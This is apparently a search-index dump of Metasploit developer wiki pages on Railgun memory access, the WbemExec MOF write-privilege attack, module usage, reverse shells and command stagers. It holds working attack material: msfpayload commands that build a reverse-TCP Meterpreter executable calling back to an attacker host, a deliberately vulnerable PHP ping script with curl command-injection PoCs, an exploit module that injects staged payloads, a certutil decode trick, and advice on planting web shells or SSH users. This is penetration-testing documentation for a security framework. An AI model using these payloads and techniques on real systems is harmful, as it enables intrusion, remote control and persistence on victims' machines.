\"thread\"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Thread:0x007fe2c5a256c0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>}> >> p.memory.allocate(1024) => 5898240 As you can see, the new allocation is at address 5898240 (or 0x005A0000 in hex). Let's first write four bytes to it: >> session.railgun.memwrite(5898240, \"AAAA\", 4) => true memwrite returns true, which means successful. Now let's read 4 bytes from 0x005A0000: >> session.railgun.memread(5898240, 4) => \"AAAA\" Be aware that if you supply a bad pointer, you can cause an access violation and crash Meterpreter.","title":"Memory Reading and Writing"},{"location":"dev/dark/How-to-use-Railgun-for-Windows-post-exploitation/#references","text":"https://www.youtube.com/watch?v=AniR-T0AnnI https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf https://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/extensions/stdapi/railgun http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx http://msdn.microsoft.com/en-us/library/aa383749 http://undocumented.ntinternals.net/ http://source.winehq.org/WineAPI/","title":"References:"},{"location":"dev/dark/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows/","text":"Windows Management Instrumentation (WMI) is Microsoft's implementation of Web-Based Enterprise Management (WBEM), which uses Managed Object Format (MOF) to create Common Information Model (CIM) classes. The security community was actually unfamiliar with the evilness of this technology until the birth of Stuxnet, which used a MOF file to exploit a vulnerability allowing the attacker to create files via a fake Printer Spooler service. This technique was later reverse-engineered and demonstrated in Metasploit's ms10_061_spoolss.rb module, and that significantly changed how we approach write-privilege attacks. Generally speaking, if you find yourself being able to write to system32, you can most likely take advantage of this technique. Requirements To to able to use the WBemExec mixin, you must meet these requirements: Write permission to C:\\Windows\\System32\\ Write permission to C:\\Windows\\System32\\Wbem\\ The target must NOT be newer than Windows Vista (so mostly good for XP, Win 2003, or older). This is more of a limitation from the API, not the technique. Newer Windows operating systems need the MOF file to be pre-compiled first. Usage First, include the WbemExec mixin under the scope of your Metasploit3 class. You will also need the EXE mixin to generate an executable: include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec Next, generate a payload name and the executable: payload_name = \"evil.exe\" exe = generate_payload_exe And then generate the mof file using the generate_mof method. The first argument should be the name of the mof file, and the second argument is the payload name: mof_name = \"evil.mof\" mof = generate_mof ( mof_name , payload_name ) Now you're ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to C:\\Windows\\System32\\ . upload_file_to_system32 ( payload_name , exe ) # Write your own upload method And then now you can upload the mof file to C:\\Windows\\System32\\wbem\\ : upload_mof ( mof_name , mof ) # Write your own upload method Once the mof file is uploaded, the Windows Management Service should pick that up and execute it, which will end up executing your payload in system32. Also, the mof file will automatically be moved out of the mof directory after use. References https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb","title":"How to use WbemExec for a write privilege attack on Windows"},{"location":"dev/dark/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows/#requirements","text":"To to able to use the WBemExec mixin, you must meet these requirements: Write permission to C:\\Windows\\System32\\ Write permission to C:\\Windows\\System32\\Wbem\\ The target must NOT be newer than Windows Vista (so mostly good for XP, Win 2003, or older). This is more of a limitation from the API, not the technique. Newer Windows operating systems need the MOF file to be pre-compiled first.","title":"Requirements"},{"location":"dev/dark/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows/#usage","text":"First, include the WbemExec mixin under the scope of your Metasploit3 class. You will also need the EXE mixin to generate an executable: include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec Next, generate a payload name and the executable: payload_name = \"evil.exe\" exe = generate_payload_exe And then generate the mof file using the generate_mof method. The first argument should be the name of the mof file, and the second argument is the payload name: mof_name = \"evil.mof\" mof = generate_mof ( mof_name , payload_name ) Now you're ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to C:\\Windows\\System32\\ . upload_file_to_system32 ( payload_name , exe ) # Write your own upload method And then now you can upload the mof file to C:\\Windows\\System32\\wbem\\ : upload_mof ( mof_name , mof ) # Write your own upload method Once the mof file is uploaded, the Windows Management Service should pick that up and execute it, which will end up executing your payload in system32. Also, the mof file will automatically be moved out of the mof directory after use.","title":"Usage"},{"location":"dev/dark/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows/#references","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb","title":"References"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/","text":"As an user, one thing we love Metasploit the most is it allows something really technically difficult to understand or engineer into something really easy to use, literally within a few clicks away to make you look like Neo from the Matrix. It makes hacking super easy. However, if you're new to Metasploit, know this: Nobody makes their first jump . You are expected to make mistakes, sometimes small, sometimes catastrophic... hopefully not. You're very likely to fall on your face with your first exploit, just like Neo. Obviously, to become The One you must learn to use these modules appropriately, and we will teach you how. In this documentation, understand that we require you no exploit development knowledge. Some programming knowledge would be nice, of course. The whole point is that there is actually \"homework\" before using an exploit, and you should always do your homework. Loading a Metasploit module Each Metasploit module comes with some metadata that explains what it's about, and to see that you must load it first. An example: msf > use exploit/windows/smb/ms08_067_netapi Read the module description and references This may sound surprising, but sometimes we get asked questions that are already explained in the module. You should always look for the following in the description or the references it provides before deciding whether it's appropriate to use the exploit or not: What products and versions are vulnerable : This is the most basic thing you should know about a vulnerability. What type of vulnerability and how it works : Basically, you are learning the exploit's side-effects. For example, if you're exploiting a memory corruption, if it fails due to whatever reason, you may crash the service. Even if it doesn't, when you're done with the shell and type \"exit\", it's still possible to crash it too. High level bugs are generally safer, but not 100%. For example, maybe it needs to modify a config file or install something that can cause the application to be broken, and may become permanent. Which ones have been tested : When a module is developed, usually the exploit isn't tested against every single setup if there are too many. Usually the developers will just try to test whatever they can get their hands on. So if your target isn't mentioned here, keep in mind there is no guarantee it's going to work 100%. The safest thing to do is to actually recreate the environment your target has, and test the exploit before hitting the real thing. What conditions the server must meet in order to be exploitable : Quite often, a vulnerability requires multiple conditions to be exploitable. In some cases you can rely on the exploit's check command , because when Metasploit flags something as vulnerable, it actually exploited the bug. For browser exploits using the BrowserExploitServer mixin, it will also check exploitable requirements before loading the exploit. But automation isn't always there, so you should try to find this information before running that \"exploit\" command. Sometimes it's just common sense, really. For example: a web application's file upload feature might be abused to upload a web-based backdoor, and stuff like that usually requires the upload folder to be accessible for the user. If your target doesn't meet the requirement(s), there is no point to try. You can use the info command to see the module's description: msf exploit(ms08_067_netapi) > info Read the target list Every Metasploit exploit has a target list. Basically this is a list of setups the developers have tested before making the exploit publicly available. If your target machine isn't on the list, it's better to assume the exploit has never been tested on that particular setup. If the exploit supports automatic targeting, it is always the first item on the list (or index 0). The first item is also almost always the default target. What this means is that you should never assume the exploit will automatically select a target for you if you've never used it before, and that the default setup might not be the one you're testing against. The \"show options\" command will tell you which target is selected. For example: msf exploit(ms08_067_netapi) > show options The \"show targets\" command will give you a list of targets supported: msf exploit(ms08_067_netapi) > show targets Check all the options All Metasploit modules come with most datastore options pre-configured. However, they may not be suitable for the particular setup you're testing. To do a quick double-check, usually the \"show options\" command is enough: msf exploit(ms08_067_netapi) > show options However, \"show options\" only shows you all the basic options. It does not show you the evasive or advanced options (try \"show evasion\" and \"show advanced\"), the command you should use that shows you all the datastore options is actually the \"set\" command: msf exploit(ms08_067_netapi) > set Find the module's pull request The Metasploit repository is hosted on Github (duh... you're on it right now), and the developers/contributors rely on it heavily for development. Before a module is made public, it is submitted as a pull request for final testing and review. In there, you will find pretty much everything you need to know about the module, and probably things you won't learn from reading the module's description or some random blog post. The information is like gold, really. Things you might learn from reading a pull request: Steps on how to set up the vulnerable environment. What targets were actually tested. How the module is meant to be used. How the module was verified. What problems were identified. Problems you might want to know. Demonstrations. Other surprises. There are mainly two ways to find the pull request of the module you're using: Via the pull request number : If you actually know the pull request number, this is the easiest. Simply go: https://github.com/rapid7/metasploit-framework/pull/[PULL REQUEST NUMBER HERE] Via filters : This is most likely how you find the pull request. First off, you should go here: https://github.com/rapid7/metasploit-framework/pulls . At the top, you will see a search input box with the default filters: is:pr is:open . These default ones mean you're looking at pull requests, and you're looking at the ones that are still pending - still waiting to be merged to Metasploit. Well, since you're finding the one that's already merged, you should do these: Click on \"Closed\". Select label \"module\". In the search box, enter additional keywords related to the module. The module's title probably provides the best keywords. Note: If the module was written before Nov 2011, you WILL NOT find the pull request for it.","title":"How to use a Metasploit module appropriately"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/#loading-a-metasploit-module","text":"Each Metasploit module comes with some metadata that explains what it's about, and to see that you must load it first. An example: msf > use exploit/windows/smb/ms08_067_netapi","title":"Loading a Metasploit module"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/#read-the-module-description-and-references","text":"This may sound surprising, but sometimes we get asked questions that are already explained in the module. You should always look for the following in the description or the references it provides before deciding whether it's appropriate to use the exploit or not: What products and versions are vulnerable : This is the most basic thing you should know about a vulnerability. What type of vulnerability and how it works : Basically, you are learning the exploit's side-effects. For example, if you're exploiting a memory corruption, if it fails due to whatever reason, you may crash the service. Even if it doesn't, when you're done with the shell and type \"exit\", it's still possible to crash it too. High level bugs are generally safer, but not 100%. For example, maybe it needs to modify a config file or install something that can cause the application to be broken, and may become permanent. Which ones have been tested : When a module is developed, usually the exploit isn't tested against every single setup if there are too many. Usually the developers will just try to test whatever they can get their hands on. So if your target isn't mentioned here, keep in mind there is no guarantee it's going to work 100%. The safest thing to do is to actually recreate the environment your target has, and test the exploit before hitting the real thing. What conditions the server must meet in order to be exploitable : Quite often, a vulnerability requires multiple conditions to be exploitable. In some cases you can rely on the exploit's check command , because when Metasploit flags something as vulnerable, it actually exploited the bug. For browser exploits using the BrowserExploitServer mixin, it will also check exploitable requirements before loading the exploit. But automation isn't always there, so you should try to find this information before running that \"exploit\" command. Sometimes it's just common sense, really. For example: a web application's file upload feature might be abused to upload a web-based backdoor, and stuff like that usually requires the upload folder to be accessible for the user. If your target doesn't meet the requirement(s), there is no point to try. You can use the info command to see the module's description: msf exploit(ms08_067_netapi) > info","title":"Read the module description and references"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/#read-the-target-list","text":"Every Metasploit exploit has a target list. Basically this is a list of setups the developers have tested before making the exploit publicly available. If your target machine isn't on the list, it's better to assume the exploit has never been tested on that particular setup. If the exploit supports automatic targeting, it is always the first item on the list (or index 0). The first item is also almost always the default target. What this means is that you should never assume the exploit will automatically select a target for you if you've never used it before, and that the default setup might not be the one you're testing against. The \"show options\" command will tell you which target is selected. For example: msf exploit(ms08_067_netapi) > show options The \"show targets\" command will give you a list of targets supported: msf exploit(ms08_067_netapi) > show targets","title":"Read the target list"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/#check-all-the-options","text":"All Metasploit modules come with most datastore options pre-configured. However, they may not be suitable for the particular setup you're testing. To do a quick double-check, usually the \"show options\" command is enough: msf exploit(ms08_067_netapi) > show options However, \"show options\" only shows you all the basic options. It does not show you the evasive or advanced options (try \"show evasion\" and \"show advanced\"), the command you should use that shows you all the datastore options is actually the \"set\" command: msf exploit(ms08_067_netapi) > set","title":"Check all the options"},{"location":"dev/dark/How-to-use-a-Metasploit-module-appropriately/#find-the-modules-pull-request","text":"The Metasploit repository is hosted on Github (duh... you're on it right now), and the developers/contributors rely on it heavily for development. Before a module is made public, it is submitted as a pull request for final testing and review. In there, you will find pretty much everything you need to know about the module, and probably things you won't learn from reading the module's description or some random blog post. The information is like gold, really. Things you might learn from reading a pull request: Steps on how to set up the vulnerable environment. What targets were actually tested. How the module is meant to be used. How the module was verified. What problems were identified. Problems you might want to know. Demonstrations. Other surprises. There are mainly two ways to find the pull request of the module you're using: Via the pull request number : If you actually know the pull request number, this is the easiest. Simply go: https://github.com/rapid7/metasploit-framework/pull/[PULL REQUEST NUMBER HERE] Via filters : This is most likely how you find the pull request. First off, you should go here: https://github.com/rapid7/metasploit-framework/pulls . At the top, you will see a search input box with the default filters: is:pr is:open . These default ones mean you're looking at pull requests, and you're looking at the ones that are still pending - still waiting to be merged to Metasploit. Well, since you're finding the one that's already merged, you should do these: Click on \"Closed\". Select label \"module\". In the search box, enter additional keywords related to the module. The module's title probably provides the best keywords. Note: If the module was written before Nov 2011, you WILL NOT find the pull request for it.","title":"Find the module's pull request"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/","text":"There are two popular types of shells: bind and reverse. A bind shell is the kind that opens up a new service on the target machine, and requires the attacker to connect to it in order to get a session. A reverse shell (also known as a connect-back) is the exact opposite: it requires the attacker to set up a listener first on his box, the target machine acts as a client connecting to that listener, and then finally the attacker receives the shell. The basic usage of payloads is already quite well documented in the Users Guide in Metasploit's documentation folder. However, learning how to use a reverse shell still remains the most common question in the Metasploit community. Plus, 9 times out of 10 you'd probably be using a reverse shell to get a session, so in this wiki documentation we will explain more about this. List of Metasploit reverse shells As of now, there are 168 different reverse shells in the Metasploit Framework. We will not list all of them here, because that's just straight up spamming. But if you'd like, you can run the following command to get msfpayload to tell you: ./msfpayload -l | grep reverse As a rule of thumb, always pick a meterpreter, because it currently provides better support of post exploitation Metasploit has to offer. For example, railgun, post modules, unique meterpreter commands (like webcam controls), etc. In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. But you can also try windows/meterpreter/reverse_http or windows/meterpreter/reverse_https, because their network traffic appear a little bit less abnormal. In Linux, you can also try linux/x86/meterpreter/reverse_tcp, or the 64-bit one. However, just know that linux/x86/shell_reverse_tcp has been the most stable. When to use a reverse shell If you find yourself in one of the following scenarios (but not limited to), then you should consider using a reverse shell: The target machine is behind a different private network. The target machine's firewall blocks incoming connection attempts to your bindshell. Your payload is unable to bind to the port it wants due to whatever reason. You simply can't decide what to choose. When a reverse shell isn't needed Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example: if the target machine is already running a SSH server, then you can try adding a new user to it and use that. If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP \"web shell\". IIS servers usually support ASP, or ASP.net. The Metasploit Framework offers payloads in all these languages (and many others). Same thing for VNC, remote desktop, SMB (psexec), or other remote admin tools, etc. How to set up for a reverse shell during payload generation When you generate a reverse shell with either msfpayload or msfvenom, you must know how to configure the following: LHOST - This is the IP address you want your target machine to connect to, literally. If you're in a local area network, it is unlikely your target machine can actually reach you unless you both are in the same network. In that case, you will have to find out your public-facing IP address , and then configure your network to port-forward that connection to your box. LHOST should not be \"localhost\", or \"0.0.0.0\", or \"127.0.0.1\", because if you do, you're telling the target machine to connect to itself (or it may not work at all). LPORT - This the port you want your target machine to connect to. When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective): LHOST - This is the IP address you want your listener to bind to. LPORT - This is the port you want your listener to bind to. You should make sure the listener has started first before executing the reverse shell. Demonstration In this demonstration, we have two boxes: Box A: The attacker's box that receives the payload session IP is: 192.168.1.123 (ifconfig) On the same network as the victim machine Box B: The \"victim\" machine Windows XP IP is: 192.168.1.80 (ipconfig) On the same network as the attacker machine For testing purposes, no antivirus enabled. For testing purposes, no firewall enabled, either. Step 1: I generate my executable payload: On the attacker's box, I run msfpayload like the following (or msfvenom, whatever you prefer): $ ./msfpayload windows/meterpreter/reverse_tcp lhost = 192 .168.1.123 lport = 4444 X > /tmp/iambad.exe Created by msfpayload ( http://www.metasploit.com ) . Payload: windows/meterpreter/reverse_tcp Length: 287 Options: { \"LHOST\" = > \"192.168.1.123\" , \"LPORT\" = > \"4444\" } Step 2: I copy my executable payload to Box B (my victim machine) This step requires no further explanation. Step 3: I set up my payload handler on box A (the attacker's box): $ ./msfconsole -q msf > use exploit/multi/handler msf exploit ( handler ) > set payload windows/meterpreter/reverse_tcp payload = > windows/meterpreter/reverse_tcp msf exploit ( handler ) > set lhost 192 .168.1.123 lhost = > 192 .168.1.123 msf exploit ( handler ) > set lport 4444 lport = > 4444 msf exploit ( handler ) > run [ * ] Started reverse handler on 192 .168.1.123:4444 [ * ] Starting the payload handler... Step 4: I double-click on the malicious executable This step requires no further explanation. Step 5: I should see a meterpreter/payload session on box A (the attacker's box) Like this: $ ./msfconsole -q msf > use exploit/multi/handler msf exploit ( handler ) > set payload windows/meterpreter/reverse_tcp payload = > windows/meterpreter/reverse_tcp msf exploit ( handler ) > set lhost 192 .168.1.123 lhost = > 192 .168.1.123 msf exploit ( handler ) > set lport 4444 lport = > 4444 msf exploit ( handler ) > run [ * ] Started reverse handler on 192 .168.1.123:4444 [ * ] Starting the payload handler... [ * ] Sending stage ( 770048 bytes ) to 192 .168.1.80 [ * ] Meterpreter session 1 opened ( 192 .168.1.123:4444 -> 192 .168.1.80:1138 ) at 2014 -10-22 19 :03:43 -0500 meterpreter > The meterpreter prompt means you are currently interacting with the payload.","title":"How to use a reverse shell in Metasploit"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/#list-of-metasploit-reverse-shells","text":"As of now, there are 168 different reverse shells in the Metasploit Framework. We will not list all of them here, because that's just straight up spamming. But if you'd like, you can run the following command to get msfpayload to tell you: ./msfpayload -l | grep reverse As a rule of thumb, always pick a meterpreter, because it currently provides better support of post exploitation Metasploit has to offer. For example, railgun, post modules, unique meterpreter commands (like webcam controls), etc. In Windows, the most commonly used reverse shell is windows/meterpreter/reverse. But you can also try windows/meterpreter/reverse_http or windows/meterpreter/reverse_https, because their network traffic appear a little bit less abnormal. In Linux, you can also try linux/x86/meterpreter/reverse_tcp, or the 64-bit one. However, just know that linux/x86/shell_reverse_tcp has been the most stable.","title":"List of Metasploit reverse shells"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/#when-to-use-a-reverse-shell","text":"If you find yourself in one of the following scenarios (but not limited to), then you should consider using a reverse shell: The target machine is behind a different private network. The target machine's firewall blocks incoming connection attempts to your bindshell. Your payload is unable to bind to the port it wants due to whatever reason. You simply can't decide what to choose.","title":"When to use a reverse shell"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/#when-a-reverse-shell-isnt-needed","text":"Generally speaking, if you can backdoor an existing service, you may not need a reverse shell. For example: if the target machine is already running a SSH server, then you can try adding a new user to it and use that. If the target machine is running a web server that supports a server-side programming language, then you can leave a backdoor in that language. For example, many Apache servers support PHP, then you can use a PHP \"web shell\". IIS servers usually support ASP, or ASP.net. The Metasploit Framework offers payloads in all these languages (and many others). Same thing for VNC, remote desktop, SMB (psexec), or other remote admin tools, etc.","title":"When a reverse shell isn't needed"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/#how-to-set-up-for-a-reverse-shell-during-payload-generation","text":"When you generate a reverse shell with either msfpayload or msfvenom, you must know how to configure the following: LHOST - This is the IP address you want your target machine to connect to, literally. If you're in a local area network, it is unlikely your target machine can actually reach you unless you both are in the same network. In that case, you will have to find out your public-facing IP address , and then configure your network to port-forward that connection to your box. LHOST should not be \"localhost\", or \"0.0.0.0\", or \"127.0.0.1\", because if you do, you're telling the target machine to connect to itself (or it may not work at all). LPORT - This the port you want your target machine to connect to. When you set up a listener for the reverse shell, you also at least need to configure LHOST and LPORT, but slightly different meanings (different perspective): LHOST - This is the IP address you want your listener to bind to. LPORT - This is the port you want your listener to bind to. You should make sure the listener has started first before executing the reverse shell.","title":"How to set up for a reverse shell during payload generation"},{"location":"dev/dark/How-to-use-a-reverse-shell-in-Metasploit/#demonstration","text":"In this demonstration, we have two boxes: Box A: The attacker's box that receives the payload session IP is: 192.168.1.123 (ifconfig) On the same network as the victim machine Box B: The \"victim\" machine Windows XP IP is: 192.168.1.80 (ipconfig) On the same network as the attacker machine For testing purposes, no antivirus enabled. For testing purposes, no firewall enabled, either. Step 1: I generate my executable payload: On the attacker's box, I run msfpayload like the following (or msfvenom, whatever you prefer): $ ./msfpayload windows/meterpreter/reverse_tcp lhost = 192 .168.1.123 lport = 4444 X > /tmp/iambad.exe Created by msfpayload ( http://www.metasploit.com ) . Payload: windows/meterpreter/reverse_tcp Length: 287 Options: { \"LHOST\" = > \"192.168.1.123\" , \"LPORT\" = > \"4444\" } Step 2: I copy my executable payload to Box B (my victim machine) This step requires no further explanation. Step 3: I set up my payload handler on box A (the attacker's box): $ ./msfconsole -q msf > use exploit/multi/handler msf exploit ( handler ) > set payload windows/meterpreter/reverse_tcp payload = > windows/meterpreter/reverse_tcp msf exploit ( handler ) > set lhost 192 .168.1.123 lhost = > 192 .168.1.123 msf exploit ( handler ) > set lport 4444 lport = > 4444 msf exploit ( handler ) > run [ * ] Started reverse handler on 192 .168.1.123:4444 [ * ] Starting the payload handler... Step 4: I double-click on the malicious executable This step requires no further explanation. Step 5: I should see a meterpreter/payload session on box A (the attacker's box) Like this: $ ./msfconsole -q msf > use exploit/multi/handler msf exploit ( handler ) > set payload windows/meterpreter/reverse_tcp payload = > windows/meterpreter/reverse_tcp msf exploit ( handler ) > set lhost 192 .168.1.123 lhost = > 192 .168.1.123 msf exploit ( handler ) > set lport 4444 lport = > 4444 msf exploit ( handler ) > run [ * ] Started reverse handler on 192 .168.1.123:4444 [ * ] Starting the payload handler... [ * ] Sending stage ( 770048 bytes ) to 192 .168.1.80 [ * ] Meterpreter session 1 opened ( 192 .168.1.123:4444 -> 192 .168.1.80:1138 ) at 2014 -10-22 19 :03:43 -0500 meterpreter > The meterpreter prompt means you are currently interacting with the payload.","title":"Demonstration"},{"location":"dev/dark/How-to-use-command-stagers/","text":"Command stagers provide an easy way to write exploits against typical vulnerabilities such as command execution or code injection . There are currently eight different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute. The Vulnerability Test Case The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping: <?php if ( isset ( $_GET [ \"ip\" ]) ) { $output = system ( \"ping -c 1 \" . $_GET [ \"ip\" ]); die ( $output ); } ?> <html> <body> <form action = \"ping.php\" method = \"GET\"> IP to ping: <input type = \"text\" name = \"ip\" /> <input type = \"submit\" /> </form> </body> </html> Place the above PHP script (ping.php) on an Ubuntu + Apache + PHP server. Under normal usage, this is how the script behaves - it just pings the host you specify, and shows you the output: $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms OK, now we can abuse that a little and execute another command (id): $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it. The Msf::Exploit::CmdStager Mixin Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do: 1. Include the Msf::Exploit::CmdStager mixin Although there are eight flavors of mixins/stagers, you only need to include Msf::Exploit::CmdStager when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers: include Msf :: Exploit :: CmdStager 2. Declare your flavors To tell Msf::Exploit::CmdStager what flavors you want, you can add the CmdStagerFlavor info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed. An example of setting flavors for a specific target: 'Targets' => [ [ 'Windows' , { 'Arch' => [ ARCH_X86_64 , ARCH_X86 ] , 'Platform' => 'win' , 'CmdStagerFlavor' => [ 'certutil' , 'vbs' ] } ] ] Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin) execute_cmdstager ( flavor : :vbs ) 3. Create the execute_command method You also must create a def execute_command(cmd, opts = {}) method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the cmd variable to the vulnerable code. 4. Call #execute_cmdstager to begin And lastly, in your exploit method, call execute_cmdstager to begin the command stager. Over the years, we have also learned that these options are quite handy when calling execute_cmdstager: flavor - You can specify what command stager (flavor) to use from here. Options are: :bourne , :debug_asm , :debug_write , :echo , :printf , :vbs , :certutil , :tftp . delay - How much time to delay between each command execution. 0.25 is default. linemax - Maximum number of characters per command. 2047 is default. Msf::Exploit::CmdStager Template At the minimum, this is how your exploit should start when you're using the CmdStager mixin: require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: CmdStager def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Command Injection Using CmdStager\" , 'Description' => %q{ This exploits a command injection using the command stager. } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Platform' => 'linux' , 'Targets' => [ [ 'Linux' , {} ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'CmdStagerFlavor' => [ 'printf' ] , 'Privileged' => false , 'DisclosureDate' => \"Jun 10 2016\" , 'DefaultTarget' => 0 )) end def execute_command ( cmd , opts = {}) # calls some method to inject cmd to the vulnerable code. end def exploit print_status ( \"Exploiting...\" ) execute_cmdstager end end As you can see, we have chosen the \"printf\" flavor as our command stager. We will explain more about this later, but basically what it does is it writes our payload to /tmp and execute it. Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this: 127.0.0.1+%26%26+[Malicious commands] We do that in execute_command using HttpClient . Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected: def filter_bad_chars ( cmd ) cmd . gsub! ( /chmod \\+x/ , 'chmod 777' ) cmd . gsub! ( /;/ , ' %26%26 ' ) cmd . gsub! ( / / , '+' ) end def execute_command ( cmd , opts = {}) send_request_cgi ({ 'method' => 'GET' , 'uri' => '/ping.php' , 'encode_params' => false , 'vars_get' => { 'ip' => \"127.0.0.1+%26%26+ #{ filter_bad_chars ( cmd ) } \" } }) end def exploit print_status ( \"Exploiting...\" ) execute_cmdstager end And let's run that, we should have a shell: msf exploit(cmdstager_demo) > run [*] Started reverse TCP handler on 10.6.0.92:4444 [*] Exploiting... [*] Transmitting intermediate stager for over-sized stage...(105 bytes) [*] Sending stage (1495599 bytes) to 10.6.0.92 [*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500 Flavors Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command stagers you can use. VBS Command Stager - Windows Only The VBS command stager is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a VBS script using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it. If you are exploiting Windows that supports Powershell, then you might want to consider using that instead of the VBS stager, because Powershell tends to be more stealthy. To use the VBS stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'vbs' ] Or set the :vbs key to execute_cmdstager: execute_cmdstager ( flavor : :vbs ) You will also need to make sure the module's supported platforms include windows (also in the metadata), example: 'Platform' => 'win' Certutil Command Stager - Windows Only Certutil is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8. One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates: echo -----BEGIN CERTIFICATE----- > encoded.txt echo Just Base64 encode your binary data echo TVoAAA == >> encoded.txt echo -----END CERTIFICATE----- >> encoded.txt certutil -decode encoded.txt decoded.bin To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it. To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'certutil' ] Or set the :certutil key to execute_cmdstager: execute_cmdstager ( flavor : :certutil ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win' Debug_write Command Stager - Windows Only The debug_write command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute. Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net. To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'debug_write' ] Or set the :debug_write key to execute_cmdstager: execute_cmdstager ( flavor : :debug_write ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win' Debug_asm Command Stager - Windows Only The debug_asm command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it. To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'debug_asm' ] Or set the :debug_asm key to execute_cmdstager: execute_cmdstager ( flavor : :debug_asm ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win' TFTP Command Stager - Windows Only The TFTP command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default. The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root: rvmsudo ./msfconsole To use the TFTP stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'tftp' ] Or set the :tftp key to execute_cmdstager: execute_cmdstager ( flavor : 